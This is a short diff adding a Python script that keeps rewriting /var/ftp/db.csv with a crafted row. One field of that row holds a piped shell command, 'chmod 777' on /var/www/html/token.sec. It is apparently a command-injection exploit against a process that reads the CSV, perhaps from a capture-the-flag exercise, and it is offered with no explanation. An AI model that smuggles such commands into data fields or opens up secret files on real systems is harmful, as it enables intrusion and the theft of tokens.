@@ -1,0 +1,8 @@
+import time
+i = 0
+while True:
+    with open('/var/ftp/db.csv', 'w') as csv:
+        csv.write('Name;Surname;In;Out;ID\nCynthia;Clinton;1497515460.0|chmod 777 /var/www/html/token.sec;1497537060.0;83707')
+        time.sleep(5)
+    i += 1
+    print(i)
